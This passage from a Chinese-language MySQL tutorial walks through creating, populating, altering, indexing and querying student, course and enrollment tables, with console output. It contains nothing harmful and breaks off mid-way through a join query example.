Grade SMALLINT,</span><br><span class=\"line\">    -&gt; PRIMARY KEY(Sno,Cno) //以元组的形式创建多个主键</span><br><span class=\"line\">    -&gt; );</span><br><span class=\"line\">Query OK, 0 rows affected (0.14 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; desc sc;</span><br><span class=\"line\">+<span class=\"comment\">-------+-------------+------+-----+---------+-------+</span></span><br><span class=\"line\">| Field | Type        | Null | Key | Default | Extra |</span><br><span class=\"line\">+<span class=\"comment\">-------+-------------+------+-----+---------+-------+</span></span><br><span class=\"line\">| Sno   | char(12)    | NO   | PRI |         |       |</span><br><span class=\"line\">| Cno   | char(15)    | NO   | PRI |         |       |</span><br><span class=\"line\">| Grade | smallint(6) | YES  |     | NULL    |       |</span><br><span class=\"line\">+<span class=\"comment\">-------+-------------+------+-----+---------+-------+</span></span><br><span class=\"line\">3 rows in <span class=\"keyword\">set</span> (<span class=\"number\">0.01</span> sec)</span><br></pre></td></tr></table></figure>\n\n<p>向各个表都插入数据</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; INSERT INTO student</span><br><span class=\"line\">    -&gt; (Sno,Sname,Ssex,Sage,Sdept)</span><br><span class=\"line\">    -&gt; VALUES</span><br><span class=\"line\">    -&gt; ('201708034210','LiYong','male',20,'CS');</span><br><span class=\"line\">Query OK, 1 row affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from student;</span><br><span class=\"line\">+<span class=\"comment\">--------------+--------+------+------+-------+</span></span><br><span class=\"line\">| Sno          | Sname  | Ssex | Sage | Sdept |</span><br><span class=\"line\">+<span class=\"comment\">--------------+--------+------+------+-------+</span></span><br><span class=\"line\">| 201708034210 | LiYong | male |   20 | CS    |</span><br><span class=\"line\">+<span class=\"comment\">--------------+--------+------+------+-------+</span></span><br><span class=\"line\">1 row in <span class=\"keyword\">set</span> (<span class=\"number\">0.00</span> sec)</span><br></pre></td></tr></table></figure>\n\n<p>插入多行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; INSERT INTO student</span><br><span class=\"line\">    -&gt; (Sno,Sname,Ssex,Sage,Sdept)</span><br><span class=\"line\">    -&gt; VALUES</span><br><span class=\"line\">    -&gt; (&apos;201215122&apos;,&apos;LiuChen&apos;,&apos;female&apos;,19,&apos;CS&apos;),</span><br><span class=\"line\">    -&gt; (&apos;201215123&apos;,&apos;WangMin&apos;,&apos;female&apos;,18,&apos;CS&apos;),</span><br><span class=\"line\">    -&gt; (&apos;201215125&apos;,&apos;ZhangLi&apos;,&apos;&apos;,19,&apos;IS&apos;);</span><br><span class=\"line\">mysql&gt; select * from student;</span><br><span class=\"line\">+--------------+---------+--------+------+-------+</span><br><span class=\"line\">| Sno          | Sname   | Ssex   | Sage | Sdept |</span><br><span class=\"line\">+--------------+---------+--------+------+-------+</span><br><span class=\"line\">| 201708034210 | LiYong  | male   |   20 | CS    |</span><br><span class=\"line\">| 201215122    | LiuChen | female |   19 | CS    |</span><br><span class=\"line\">| 201215123    | WangMin | female |   18 | CS    |</span><br><span class=\"line\">| 201215125    | ZhangLi |        |   19 | IS    |</span><br><span class=\"line\">+--------------+---------+--------+------+-------+</span><br><span class=\"line\">4 rows in set (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; INSERT INTO COURSE</span><br><span class=\"line\">    -&gt; (Cno,Cname,Cpno,Credits)</span><br><span class=\"line\">    -&gt; VALUES</span><br><span class=\"line\">    -&gt; (&apos;2&apos;,&apos;math&apos;,&apos;&apos;,2),</span><br><span class=\"line\">    -&gt; (&apos;3&apos;,&apos;infosystem&apos;,&apos;1&apos;,4),</span><br><span class=\"line\">    -&gt; (&apos;4&apos;,&apos;os&apos;,&apos;6&apos;,3),</span><br><span class=\"line\">    -&gt; (&apos;5&apos;,&apos;datestructure&apos;,&apos;7&apos;,4),</span><br><span class=\"line\">    -&gt; (&apos;6&apos;,&apos;dateprocessing&apos;,&apos;&apos;,2),</span><br><span class=\"line\">    -&gt; (&apos;7&apos;,&apos;python&apos;,&apos;6&apos;,4);</span><br><span class=\"line\">mysql&gt; select * from course;</span><br><span class=\"line\">+-----+----------------+------+---------+</span><br><span class=\"line\">| Cno | Cname          | Cpno | Credits |</span><br><span class=\"line\">+-----+----------------+------+---------+</span><br><span class=\"line\">| 1   | database       | 5    |       4 |</span><br><span class=\"line\">| 2   | math           |      |       2 |</span><br><span class=\"line\">| 3   | infosystem     | 1    |       4 |</span><br><span class=\"line\">| 4   | os             | 6    |       3 |</span><br><span class=\"line\">| 5   | datestructure  | 7    |       4 |</span><br><span class=\"line\">| 6   | dateprocessing |      |       2 |</span><br><span class=\"line\">| 7   | python         | 6    |       4 |</span><br><span class=\"line\">+-----+----------------+------+---------+</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; INSERT INTO sc</span><br><span class=\"line\">    -&gt; (Sno,Cno,Grade)</span><br><span class=\"line\">    -&gt; VALUES</span><br><span class=\"line\">    -&gt; (&apos;201215121&apos;,&apos;1&apos;,92),</span><br><span class=\"line\">    -&gt; (&apos;201215121&apos;,&apos;3&apos;,85),</span><br><span class=\"line\">    -&gt; (&apos;201215121&apos;,&apos;2&apos;,88),</span><br><span class=\"line\">    -&gt; (&apos;201215122&apos;,&apos;2&apos;,90),</span><br><span class=\"line\">    -&gt; (&apos;201215122&apos;,&apos;3&apos;,80);</span><br><span class=\"line\">Query OK, 5 rows affected (0.00 sec)</span><br><span class=\"line\">Records: 5  Duplicates: 0  Warnings: 0</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; SELECT * FROM SC;</span><br><span class=\"line\">+-----------+-----+-------+</span><br><span class=\"line\">| Sno       | Cno | Grade |</span><br><span class=\"line\">+-----------+-----+-------+</span><br><span class=\"line\">| 201215121 | 1   |    92 |</span><br><span class=\"line\">| 201215121 | 3   |    85 |</span><br><span class=\"line\">| 201215121 | 2   |    88 |</span><br><span class=\"line\">| 201215122 | 2   |    90 |</span><br><span class=\"line\">| 201215122 | 3   |    80 |</span><br><span class=\"line\">+-----------+-----+-------+</span><br></pre></td></tr></table></figure>\n\n<p>第四条插入时想使用默认值，于是插入了空，但是却没设置为默认值，更新一下这条数据</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">UPDATE</span> table_name <span class=\"keyword\">SET</span> field1=<span class=\"keyword\">new</span>-value1, field2=<span class=\"keyword\">new</span>-value2</span><br><span class=\"line\">[<span class=\"keyword\">WHERE</span> Clause]</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; <span class=\"keyword\">UPDATE</span> student <span class=\"keyword\">SET</span> Ssex=<span class=\"string\">'male'</span> <span class=\"keyword\">WHERE</span> Sno=<span class=\"string\">'201215125'</span>;</span><br><span class=\"line\">Query OK, 1 row affected (0.00 sec)</span><br><span class=\"line\">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from student;</span><br><span class=\"line\">+<span class=\"comment\">--------------+---------+--------+------+-------+</span></span><br><span class=\"line\">| Sno          | Sname   | Ssex   | Sage | Sdept |</span><br><span class=\"line\">+<span class=\"comment\">--------------+---------+--------+------+-------+</span></span><br><span class=\"line\">| 201708034210 | LiYong  | male   |   20 | CS    |</span><br><span class=\"line\">| 201215122    | LiuChen | female |   19 | CS    |</span><br><span class=\"line\">| 201215123    | WangMin | female |   18 | CS    |</span><br><span class=\"line\">| 201215125    | ZhangLi | male   |   19 | IS    |</span><br><span class=\"line\">+<span class=\"comment\">--------------+---------+--------+------+-------+</span></span><br><span class=\"line\">4 rows in <span class=\"keyword\">set</span> (<span class=\"number\">0.00</span> sec)</span><br></pre></td></tr></table></figure>\n\n<p>正确使用默认值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; INSERT INTO student</span><br><span class=\"line\">    -&gt; (Sno,Sname,Ssex,Sage,Sdept)</span><br><span class=\"line\">    -&gt; VALUES</span><br><span class=\"line\">    -&gt; (&apos;201215124&apos;,&apos;JingYu&apos;,default,27,&apos;MATH&apos;);</span><br><span class=\"line\">    </span><br><span class=\"line\">mysql&gt; select * from student where Sno=&apos;201215124&apos;;</span><br><span class=\"line\">+-----------+--------+------+------+-------+</span><br><span class=\"line\">| Sno       | Sname  | Ssex | Sage | Sdept |</span><br><span class=\"line\">+-----------+--------+------+------+-------+</span><br><span class=\"line\">| 201215124 | JingYu | male |   27 | MATH  |</span><br><span class=\"line\">+-----------+--------+------+------+-------+</span><br></pre></td></tr></table></figure>\n\n<p>删除数据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; delete from student where Sno=&apos;s09&apos;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"索引的建立与删除\"><a href=\"#索引的建立与删除\" class=\"headerlink\" title=\"索引的建立与删除\"></a>索引的建立与删除</h3><p>建立索引是加快查询速度的有效手段。常见索引包括顺序文件上的索引、B+树索引、散列(hash)索引、位图索引等。索引管理一般由管理员完成，用户不必也不能显式地选择索引。索引属于内模式的范畴。</p>\n<h4 id=\"建立索引\"><a href=\"#建立索引\" class=\"headerlink\" title=\"建立索引\"></a>建立索引</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CREATE [UNIQUE] [CLUSTER] INDEX &lt;索引名&gt; ON &lt;表名&gt;(&lt;列名&gt; [&lt;次序&gt;]...)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; CREATE UNIQUE INDEX Stusno ON student(Sno);  //ASC 升序（默认）</span><br><span class=\"line\">mysql&gt; CREATE UNIQUE INDEX Coucno ON course(Cno);</span><br><span class=\"line\">mysql&gt; CREATE UNIQUE INDEX SCno ON SC(Sno ASC,Cno DESC); //DESC 降序</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"删除索引\"><a href=\"#删除索引\" class=\"headerlink\" title=\"删除索引\"></a>删除索引</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ALTER TABLE table_name DROP INDEX index_name;</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; ALTER TABLE SC DROP INDEX SCno;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"修改索引\"><a href=\"#修改索引\" class=\"headerlink\" title=\"修改索引\"></a>修改索引</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MYSQL 没有提供直接修改索引的命令，一般情况下我们需要先删除原索引，再建立新索引</span><br><span class=\"line\"></span><br><span class=\"line\">ALTER TABLE user</span><br><span class=\"line\">DROP INDEX idx_user_username;</span><br><span class=\"line\">--再以修改后的内容创建同名索引</span><br><span class=\"line\">CREATE INDEX idx_user_username ON user (username(8));</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"查看索引\"><a href=\"#查看索引\" class=\"headerlink\" title=\"查看索引\"></a>查看索引</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">--如果查看索引前，没有使用user db_name等命令指定具体的数据库，则必须加上FROM db_name</span><br><span class=\"line\">SHOW INDEX FROM table_name [FROM db_name]</span><br><span class=\"line\">--如果查看索引前，没有使用user db_name等命令指定具体的数据库，则必须加上db_name.前缀</span><br><span class=\"line\">SHOW INDEX FROM [db_name.]table_name</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"修改基本表\"><a href=\"#修改基本表\" class=\"headerlink\" title=\"修改基本表\"></a>修改基本表</h3><blockquote>\n<p><strong>2.1</strong> 向基本表Student中增加“入学时间”属性列，其属性名为RegisterDate，数据类型为DATETIME型</p>\n<p><strong>2.2</strong> 将Sage(年龄)的数据类型改为SMALLINT型.</p>\n<p><strong>2.3</strong> 删除属性列RegisterDate.</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; ALTER TABLE student ADD RegisterDate DATETIME; //新增列</span><br><span class=\"line\">mysql&gt; ALTER TABLE student modify column Sage smallint; //更新数据类型，注意是 modify</span><br><span class=\"line\">mysql&gt; ALTER TABLE student change column RegisterDate RDate time; //同时修改列名和列的数据类型</span><br><span class=\"line\">mysql&gt; desc student;</span><br><span class=\"line\">+-------+-------------+------+-----+---------+-------+</span><br><span class=\"line\">| Field | Type        | Null | Key | Default | Extra |</span><br><span class=\"line\">+-------+-------------+------+-----+---------+-------+</span><br><span class=\"line\">| Sno   | char(12)    | NO   | PRI | NULL    |       |</span><br><span class=\"line\">| Sname | char(20)    | NO   | UNI | NULL    |       |</span><br><span class=\"line\">| Ssex  | char(8)     | YES  |     | male    |       |</span><br><span class=\"line\">| Sage  | smallint(6) | YES  |     | NULL    |       |</span><br><span class=\"line\">| Sdept | char(15)    | YES  |     | NULL    |       |</span><br><span class=\"line\">| RDate | time        | YES  |     | NULL    |       |</span><br><span class=\"line\">+-------+-------------+------+-----+---------+-------+</span><br><span class=\"line\">6 rows in set (0.01 sec)</span><br><span class=\"line\">mysql&gt; ALTER TABLE student drop column RDate; //删除新增的列</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"数据查询\"><a href=\"#数据查询\" class=\"headerlink\" title=\"数据查询\"></a>数据查询</h3><h4 id=\"无条件查询\"><a href=\"#无条件查询\" class=\"headerlink\" title=\"无条件查询\"></a>无条件查询</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select Sname,Sno,Sdept from student; //查询基本信息</span><br><span class=\"line\">mysql&gt; select Sname,2020-Sage from student; //查询计算之后的信息</span><br><span class=\"line\">mysql&gt; select Sname,&apos;Year of Brith:&apos;,2020-Sage,LOWER(Sdept) from student; //查询全体学生的姓名、出生年份和学号，要求用小写字母表示学号中的字母</span><br><span class=\"line\">+---------+----------------+-----------+--------------+</span><br><span class=\"line\">| Sname   | Year of Brith: | 2020-Sage | LOWER(Sdept) |</span><br><span class=\"line\">+---------+----------------+-----------+--------------+</span><br><span class=\"line\">| LiYong  | Year of Brith: |      2000 | cs           |</span><br><span class=\"line\">| LiuChen | Year of Brith: |      2001 | cs           |</span><br><span class=\"line\">| WangMin | Year of Brith: |      2002 | cs           |</span><br><span class=\"line\">| ZhangLi | Year of Brith: |      2001 | is           |</span><br><span class=\"line\">| JingYu  | Year of Brith: |      1993 | math         |</span><br><span class=\"line\">+---------+----------------+-----------+--------------+</span><br><span class=\"line\">5 rows in set (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sname,&apos;Year of Brith:&apos;BIRTH,2020-Sage BIRTHDAY,LOWER(Sdept) DEPARTMENT from student; //给查询结果使用别名</span><br><span class=\"line\">+---------+----------------+----------+------------+</span><br><span class=\"line\">| Sname   | BIRTH          | BIRTHDAY | DEPARTMENT |</span><br><span class=\"line\">+---------+----------------+----------+------------+</span><br><span class=\"line\">| LiYong  | Year of Brith: |     2000 | cs         |</span><br><span class=\"line\">| LiuChen | Year of Brith: |     2001 | cs         |</span><br><span class=\"line\">| WangMin | Year of Brith: |     2002 | cs         |</span><br><span class=\"line\">| ZhangLi | Year of Brith: |     2001 | is         |</span><br><span class=\"line\">| JingYu  | Year of Brith: |     1993 | math       |</span><br><span class=\"line\">+---------+----------------+----------+------------+</span><br><span class=\"line\">5 rows in set (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; SELECT DISTINCT SNO FROM SC; //查询有选修课程的学号并去重</span><br><span class=\"line\">+-----------+                      </span><br><span class=\"line\">| SNO       |                      </span><br><span class=\"line\">+-----------+                      </span><br><span class=\"line\">| 201215121 |                      </span><br><span class=\"line\">| 201215122 |                      </span><br><span class=\"line\">+-----------+                      </span><br><span class=\"line\">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"条件查询\"><a href=\"#条件查询\" class=\"headerlink\" title=\"条件查询\"></a>条件查询</h4><p><img src=\"C:%5CUsers%5Cbrian%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200317114810992.png\" alt=\"image-20200317114810992\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select Sno,Sname from student where Sdept=&apos;MATH&apos;; //查询数学系学生信息</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sage,Sname from student where Sage BETWEEN 18 AND 22; //查询年龄区间 18-22 的学生信息</span><br><span class=\"line\">mysql&gt; select Sage,Sname from student where Sage NOT BETWEEN 18 AND 22; // 查询年龄范围之外的学生信息</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sname,Sno from student where Sdept in(&apos;CS&apos;,&apos;MATH&apos;,&apos;OS&apos;); // 查询目标院系学生信息</span><br><span class=\"line\">mysql&gt; select Sname,Sno from student where Sdept NOT in(&apos;CS&apos;,&apos;MATH&apos;,&apos;OS&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sname,Sno from student where Sname like &apos;Liu%&apos;; //查询姓名以 Liu 开头的学生信息。 % 代表任意长度</span><br><span class=\"line\">mysql&gt; select Sname,Sno from student where Sname like &apos;Liu___&apos;; //查询限定长度的姓名信息。_ 代表任意单个字符</span><br></pre></td></tr></table></figure>\n\n<p>如果要查询的字符串本身含有通配符 <code>%</code> 或 <code>_</code> ,这时就要使用 <code>ESCAPE</code> 对其转义处理。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT Cno,Credits FROM Course where Cname LIKE &apos;DB/_Design&apos; ESCAPE &apos;/&apos;;</span><br><span class=\"line\">mysql&gt; SELECT Cno,Credits FROM Course where Cname LIKE &apos;DB/_%i_&apos; ESCAPE &apos;/&apos;; DB开头，倒数第二个为 i 。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; SELECT Sno,Cno</span><br><span class=\"line\">    -&gt; FROM SC</span><br><span class=\"line\">    -&gt; WHERE Grade IS NULL;  // 参加考试但没有考试成绩</span><br><span class=\"line\">mysql&gt; SELECT Sno,Cno</span><br><span class=\"line\">    -&gt; FROM SC</span><br><span class=\"line\">    -&gt; WHERE Grade IS NOT NULL; // 所有有成绩的学生信息</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ORDER-BY-字句\"><a href=\"#ORDER-BY-字句\" class=\"headerlink\" title=\"ORDER BY 字句\"></a>ORDER BY 字句</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT Sno,Grade FROM SC WHERE Cno=&apos;3&apos; order by Grade desc; // 按成绩降序排列选修 Cno=3 的学生信息</span><br><span class=\"line\">mysql&gt; SELECT * FROM student ORDER BY Sdept,Sage DESC; // 所在系号升序，同一系学生年龄按降序。</span><br><span class=\"line\">+-----------+---------+--------+------+-------+</span><br><span class=\"line\">| Sno       | Sname   | Ssex   | Sage | Sdept |</span><br><span class=\"line\">+-----------+---------+--------+------+-------+</span><br><span class=\"line\">| 201215121 | LiYong  | male   |   20 | CS    |</span><br><span class=\"line\">| 201215122 | LiuChen | female |   19 | CS    |</span><br><span class=\"line\">| 201215123 | WangMin | female |   18 | CS    |</span><br><span class=\"line\">| 201215125 | ZhangLi | male   |   19 | IS    |</span><br><span class=\"line\">| 201215124 | JingYu  | male   |   27 | MATH  |</span><br><span class=\"line\">+-----------+---------+--------+------+-------+</span><br><span class=\"line\"></span><br><span class=\"line\">未对查询结果分组，聚集函数将作用于整个查询结果。分组后将作用于每一组。</span><br><span class=\"line\">mysql&gt; select Cno,count(Sno) from sc group by Cno; //求各个课程号(Cno)及相应的选课人数</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sno from sc group by Sno HAVING COUNT(*) &gt;=3;</span><br><span class=\"line\">+-----------+</span><br><span class=\"line\">| Sno       |</span><br><span class=\"line\">+-----------+</span><br><span class=\"line\">| 201215121 |</span><br><span class=\"line\">+-----------+</span><br><span class=\"line\">1 row in set (0.00 sec) //查询选修了3门或3门以上课程的学生学号(Sno)</span><br><span class=\"line\">WHERE 子句作用于基本表或视图，从中选择满足条件的元组，HAVING  短语作用于组，从中选择满足条件的组。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"集函数的使用\"><a href=\"#集函数的使用\" class=\"headerlink\" title=\"集函数的使用\"></a>集函数的使用</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL提供许多聚集函数，主要有：</span><br><span class=\"line\">- COUNT(*)                     统计元组个数</span><br><span class=\"line\">- COUNT([DISTINCT|ALL] &lt;列名&gt;) 统计一列中值的个数</span><br><span class=\"line\">- SUM([DISTINCT|ALL] &lt;列名&gt;)   计算一列值的总和，列必须是数值型</span><br><span class=\"line\">- AVG([DISTINCT|ALL] &lt;列名&gt;)   计算一列值的平均值，列必须是数值型</span><br><span class=\"line\">- MAX([DISTINCT|ALL] &lt;列名&gt;)   求一列值中的最大值</span><br><span class=\"line\">- MIN([DISTINCT|ALL] &lt;列名&gt;)   求一列值中的最小值</span><br><span class=\"line\">DISTINCT 短语对结果去重，默认 ALL</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">select count(*) from student;  //查询学生总人数</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select count(DISTINCT Sdept) from student; //查询有多少个专业</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select AVG(Grade) from sc where Cno=&apos;1&apos;; //计算选修C01号课程的学生平均成绩。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select MAX(Grade) from sc where Cno=&apos;1&apos;; //查询选修C01号课程的学生最高分数。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"连接查询\"><a href=\"#连接查询\" class=\"headerlink\" title=\"连接查询\"></a>连接查询</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT Sname from student,sc where student.Sno=SC.Sno AND cno=&apos;2&apos; and Grade&gt;=90; // 